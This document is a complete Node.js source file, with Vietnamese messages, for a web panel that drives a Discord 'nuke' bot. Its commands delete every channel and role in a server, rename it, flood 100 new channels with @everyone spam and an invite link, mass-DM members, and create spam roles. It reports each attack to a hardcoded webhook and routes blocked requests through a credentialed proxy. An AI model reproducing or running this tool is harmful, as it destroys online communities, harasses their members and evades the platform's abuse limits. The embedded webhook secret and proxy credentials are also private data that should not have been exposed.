import express from 'express';
import { Client, GatewayIntentBits, REST } from 'discord.js';
import { ProxyAgent } from 'undici';
import cookieParser from 'cookie-parser';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

const CONFIG = {
  channelName: '『😂  𝑷𝑯𝑻𝑼𝑨𝑵𝑲𝑯𝑨𝑵𝑯 💀』',
  renameName: '𝐍𝐔𝐊𝐄 𝐁𝐘 𝐏𝐇𝐓𝐔𝐀𝐍𝐊𝐇𝐀𝐍𝐇',
  channelCount: 100,
  msgContent: '# > NUKE BY PHTUANKHANH\n\n@everyone\n\nhttps://discord.gg/BqZ7UdtwXG',
  msgCount: 5,
  pingEveryone: true,
  roleName: 'ROLE SPAM BY PTK',
  roleCount: 20,
  dmContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG'
};

const proxyStr = 'http://flme5a8d5ad-package-standard:d4bda2c8@proxy.flameproxies.com:8989';
const proxyDispatcher = new ProxyAgent(proxyStr);

const sessions = new Map();

function getSession(req, res) {
  let sid = req.cookies.sid;
  if (!sid) {
    sid = crypto.randomBytes(16).toString('hex');
    res.cookie('sid', sid, { maxAge: 86400000, httpOnly: true });
  }
  if (!sessions.has(sid)) {
    sessions.set(sid, { client: null, clientId: null, token: null, logs: [] });
  }
  return { sid, session: sessions.get(sid) };
}

function pushLog(session, msg, type = 'info') {
  const log = { time: new Date().toLocaleTimeString(), msg, type };
  session.logs.push(log);
  if (session.logs.length > 200) session.logs.shift();
  console.log(`[${type.toUpperCase()}] ${msg}`);
}

async function notifyNuke(session, info) {
  const { guildName, guildIcon, guildId, ownerTag, ownerId, memberCount, user, error } = info;

  const fields = [
    { name: 'Server', value: guildName || 'không rõ', inline: true },
    { name: 'Owner', value: ownerTag ? `${ownerTag}` : (ownerId || '-'), inline: true },
    { name: 'Members', value: String(memberCount ?? 0), inline: true },
    { name: 'Guild ID', value: guildId || '-', inline: false },
    { name: 'Server Link', value: guildId ? `https://discord.com/channels/${guildId}` : '-', inline: false },
    { name: 'Executed By', value: user || '-', inline: true },
    { name: 'Timestamp', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
  ];
  if (error) fields.push({ name: 'Status', value: String(error).slice(0, 1000), inline: false });

  const embed = {
    title: error ? 'NUKE FAILED' : 'NUKE SUCCESS',
    description: error
      ? `Server **${guildName || '?'}** encountered an error during execution.`
      : `Server **${guildName || '?'}** has been fully cleaned.`,
    color: error ? 0x8b0000 : 0x2b2b2b,
    fields,
    author: { name: 'PHTUANKHANH', icon_url: guildIcon || undefined },
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'private operation' },
    timestamp: new Date().toISOString(),
  };

  const body = {
    username: 'PHTUANKHANH',
    avatar_url: guildIcon || null,
    allowed_mentions: { parse: [] },
    embeds: [embed]
  };

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      let res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      if ([429, 403, 404].includes(res.status)) {
        pushLog(session, `Webhook bị chặn IP (${res.status}). Chuyển qua Proxy...`, 'warn');
        res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          dispatcher: proxyDispatcher
        });
      }
      if (res.status === 429) { await new Promise(r => setTimeout(r, 3000)); continue; }
      if (!res.ok) { pushLog(session, `Webhook lỗi (${res.status})`, 'error'); return; }
      pushLog(session, `Webhook gửi thành công!`, 'success');
      return;
    } catch (e) { pushLog(session, `Webhook crash: ${e.message}`, 'error'); return; }
  }
}

async function safeRest(session, method, endpoint, data = {}) {
  if (!session.token) throw new Error("Bot chưa login");
  const rest = new REST({ version: '10' }).setToken(session.token);

  try {
    return await rest.request({ method, fullRoute: endpoint, body: data || undefined });
  } catch (err) {
    if ([429, 403, 404].includes(err.status)) {
      pushLog(session, `Discord chặn IP (${err.status}). Retry qua Proxy...`, 'warn');
      const proxyRest = new REST({ version: '10', agent: proxyDispatcher }).setToken(session.token);
      return await proxyRest.request({ method, fullRoute: endpoint, body: data || undefined });
    }
    throw err;
  }
}

function sem(n) {
  let q = [], active = 0;
  return fn => new Promise((res, rej) => {
    const go = () => {
      active++;
      fn().then(res, rej).finally(() => { active--; q.shift()?.(); });
    };
    active < n ? go() : q.push(go);
  });
}

function startBot(token, session) {
  if (session.client) {
    session.client.destroy();
    session.client = null;
    session.clientId = null;
  }

  session.token = token;

  session.client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers
    ]
  });

  session.client.on('ready', () => {
    session.clientId = session.client.user.id;
    pushLog(session, `BOT Đã online: ${session.client.user.tag}`, 'success');
  });

  session.client.on('error', e => pushLog(session, `client error: ${e.message}`, 'error'));
  session.client.on('shardError', e => pushLog(session, `shard error: ${e.message}`, 'error'));

  session.client.on('messageCreate', async (message) => {
    if (!message.client.user) return;
    if (message.author.id !== session.client.user.id) return;

    const guild = message.guild;
    if (!guild) return;
    const content = message.content.trim();

    if (content === '!menu') {
      const menuMsg =
        `**DANH SÁCH LỆNH NUKE**\n` +
        `\`!menu\` - Xem danh sách lệnh\n` +
        `\`!nuke\` - Nuke server (xoá kênh, spam kênh, dmall)\n` +
        `\`!spamrole\` - Xoá hết role cũ, spam tạo 20 role mới\n`;
      message.reply(menuMsg).catch(() => {});
      return;
    }

    if (content === '!spamrole') {
      message.reply('🚀 Bắt đầu spam role...').catch(() => {});
      pushLog(session, `Bắt đầu spam role server: ${guild.name}`, 'warn');

      try {
        const { roleName, roleCount } = CONFIG;
        const botMember = await guild.members.fetch(session.client.user.id);
        const botHighestRole = botMember.roles.highest;

        pushLog(session, `Đang xoá toàn bộ role cũ...`, 'info');
        const oldRoles = await guild.roles.fetch();

        const delPromises = [];
        for (const [id, role] of oldRoles) {
          if (role.managed || id === guild.id) continue;
          if (role.position < botHighestRole.position) {
            delPromises.push(safeRest(session, 'DELETE', `/guilds/${guild.id}/roles/${id}`).catch(() => {}));
          }
        }
        await Promise.allSettled(delPromises);

        pushLog(session, `Đang tạo ${roleCount} role spam...`, 'info');
        const createPromises = Array.from({ length: roleCount }, () =>
          safeRest(session, 'POST', `/guilds/${guild.id}/roles`, {
            name: roleName,
            color: 0xff0000
          }).catch(() => null)
        );
        await Promise.allSettled(createPromises);

        pushLog(session, `SPAM ROLE HOÀN TẤT!`, 'success');
      } catch (err) {
        pushLog(session, `Lỗi spam role: ${err.message}`, 'error');
      }
      return;
    }

    if (content === '!nuke') {
      const t0 = Date.now();
      message.reply('🚀 Bắt đầu nuke...').catch(() => {});
      pushLog(session, `Bắt đầu nuke server: ${guild.name}`, 'warn');

      let channelsCreated = 0;
      let msgsSent = 0;
      let memberCount = 0;
      let ownerTag = null;
      let iconUrl = null;

      try {
        const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;

        try { iconUrl = guild.iconURL({ size: 256, extension: 'png' }); } catch {}
        try {
          const owner = await guild.fetchOwner();
          ownerTag = owner.user.tag;
        } catch {}
        try {
          memberCount = guild.memberCount || (await guild.members.fetch()).size;
        } catch {}

        if (rName) {
          pushLog(session, `Đang đổi tên server...`, 'info');
          await safeRest(session, 'PATCH', `/guilds/${guild.id}`, { name: rName }).catch(() => {});
        }

        pushLog(session, `Đang xoá toàn bộ kênh...`, 'info');
        const oldChannels = await guild.channels.fetch().catch(() => null);
        if (oldChannels) {
          const delPromises = Array.from(oldChannels.values()).filter(Boolean).map(c =>
            safeRest(session, 'DELETE', `/channels/${c.id}`).catch(() => {})
          );
          await Promise.allSettled(delPromises);
        }

        pushLog(session, `Đang tạo ${cc} kênh và spam ${mc} tin/kênh...`, 'info');
        const chLimit = sem(5);
        const createPromises = Array.from({ length: cc }, () =>
          chLimit(async () => {
            const c = await safeRest(session, 'POST', `/guilds/${guild.id}/channels`, { name: chName, type: 0 }).catch(() => null);
            if (!c) return;
            channelsCreated++;
            for (let i = 0; i < mc; i++) {
              await safeRest(session, 'POST', `/channels/${c.id}/messages`, {
                content: msgText,
                allowed_mentions: ping ? { parse: ['everyone'] } : { parse: [] }
              }).then(() => { msgsSent++; }).catch(() => {});
            }
          })
        );
        await Promise.allSettled(createPromises);

        pushLog(session, `Đang DM toàn bộ thành viên...`, 'info');
        const members = await guild.members.fetch().catch(() => null);
        if (members) {
          const dmLimit = sem(2);
          await Promise.allSettled([...members.values()]
            .filter(m => !m.user.bot)
            .map(m => dmLimit(() =>
              m.send({ content: CONFIG.dmContent, allowedMentions: { parse: [] } }).catch(() => {})
            ))
          );
          pushLog(session, `Đã gửi DM xong.`, 'success');
        }

        await notifyNuke(session, {
          guildName: CONFIG.renameName,
          guildIcon: iconUrl,
          guildId: guild.id,
          ownerTag,
          ownerId: guild.ownerId,
          memberCount,
          user: session.client.user.username,
          error: null,
        });

        pushLog(session, `NUKE HOÀN TẤT trong ${Date.now() - t0}ms! Kênh: ${channelsCreated} | Tin: ${msgsSent}`, 'success');

      } catch (err) {
        pushLog(session, `Lỗi nuke: ${err.message}`, 'error');
        await notifyNuke(session, {
          guildName: CONFIG.renameName,
          guildIcon: iconUrl,
          guildId: guild.id,
          ownerTag,
          ownerId: guild.ownerId,
          memberCount,
          user: session.client?.user?.username,
          error: err.message,
        }).catch(() => {});
      }
      return;
    }
  });

  session.client.login(token).catch(e => {
    pushLog(session, `Lỗi đăng nhập: ${e.message}`, 'error');
    session.client = null;
    session.clientId = null;
    session.token = null;
  });
}

app.post('/api/login', async (req, res) => {
  const { token } = req.body ?? {};
  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Thiếu token' });

  const cleanToken = token.trim();
  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) return res.status(400).json({ error: 'Token không hợp lệ' });

  const { session } = getSession(req, res);
  pushLog(session, `Đang kết nối bot...`, 'info');
  startBot(cleanToken, session);

  await new Promise(r => setTimeout(r, 2500));

  if (session.client && session.client.user) {
    res.json({ ok: true, user: session.client.user.tag, clientId: session.client.user.id });
  } else {
    res.status(500).json({ error: 'Đăng nhập thất bại. Kiểm tra lại token.' });
  }
});

app.post('/api/logout', (req, res) => {
  const { session } = getSession(req, res);
  if (session.client) {
    session.client.destroy();
    session.client = null;
    session.clientId = null;
    session.token = null;
    pushLog(session, 'Đã tắt kết nối hoàn toàn.', 'warn');
  }
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  const { session } = getSession(req, res);
  res.json({
    online: !!(session.client && session.client.user),
    user: session.client?.user?.tag || null,
    clientId: session.clientId
  });
});

app.get('/api/logs', (req, res) => {
  const { session } = getSession(req, res);
  res.json(session.logs);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
